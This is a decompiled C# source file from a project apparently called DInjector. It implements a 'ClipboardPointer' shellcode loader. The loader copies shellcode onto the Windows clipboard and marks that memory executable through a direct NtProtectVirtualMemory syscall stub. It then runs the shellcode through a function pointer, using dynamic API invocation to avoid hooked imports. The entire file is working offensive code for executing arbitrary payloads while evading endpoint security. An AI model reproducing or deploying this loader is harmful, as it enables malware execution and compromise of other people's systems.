using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using DInvoke.Data;
using DInvoke.DynamicInvoke;

namespace DInjector
{
	// Token: 0x02000009 RID: 9
	internal class ClipboardPointer
	{
		// Token: 0x0600001F RID: 31 RVA: 0x00003614 File Offset: 0x00001814
		public static bool openClipboard(IntPtr hWndNewOwner)
		{
			object[] array = new object[]
			{
				hWndNewOwner
			};
			return (bool)Generic.DynamicAPIInvoke("user32.dll", "OpenClipboard", typeof(ClipboardPointer.OpenClipboard), ref array, false, true);
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00003654 File Offset: 0x00001854
		public static IntPtr setClipboardData(uint uFormat, byte[] hMem)
		{
			object[] array = new object[]
			{
				uFormat,
				hMem
			};
			return (IntPtr)Generic.DynamicAPIInvoke("user32.dll", "SetClipboardData", typeof(ClipboardPointer.SetClipboardData), ref array, false, true);
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00003698 File Offset: 0x00001898
		public static bool closeClipboard()
		{
			object[] array = new object[0];
			return (bool)Generic.DynamicAPIInvoke("user32.dll", "CloseClipboard", typeof(ClipboardPointer.CloseClipboard), ref array, false, true);
		}

		// Token: 0x06000022 RID: 34 RVA: 0x000036D0 File Offset: 0x000018D0
		public static void Execute(byte[] shellcodeBytes)
		{
			ClipboardPointer.openClipboard(IntPtr.Zero);
			IntPtr intPtr = ClipboardPointer.setClipboardData(2U, shellcodeBytes);
			ClipboardPointer.closeClipboard();
			ClipboardPointer.NtProtectVirtualMemory ntProtectVirtualMemory = (ClipboardPointer.NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtProtectVirtualMemory"), typeof(ClipboardPointer.NtProtectVirtualMemory));
			IntPtr intPtr2 = intPtr;
			IntPtr intPtr3 = (IntPtr)shellcodeBytes.Length;
			uint num;
			DInvoke.Data.Native.NTSTATUS ntstatus = ntProtectVirtualMemory(Process.GetCurrentProcess().Handle, ref intPtr2, ref intPtr3, 32U, out num);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(ClipboardPointer) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
			}
			else
			{
				Console.WriteLine(string.Format("(ClipboardPointer) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {0}", ntstatus));
			}
			((ClipboardPointer.pFunction)Marshal.GetDelegateForFunctionPointer(intPtr, typeof(ClipboardPointer.pFunction)))();
		}

		// Token: 0x02000031 RID: 49
		// (Invoke) Token: 0x06000056 RID: 86
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate bool OpenClipboard(IntPtr hWndNewOwner);

		// Token: 0x02000032 RID: 50
		// (Invoke) Token: 0x0600005A RID: 90
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate IntPtr SetClipboardData(uint uFormat, byte[] hMem);

		// Token: 0x02000033 RID: 51
		// (Invoke) Token: 0x0600005E RID: 94
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate bool CloseClipboard();

		// Token: 0x02000034 RID: 52
		// (Invoke) Token: 0x06000062 RID: 98
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

		// Token: 0x02000035 RID: 53
		// (Invoke) Token: 0x06000066 RID: 102
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate void pFunction();
	}
}
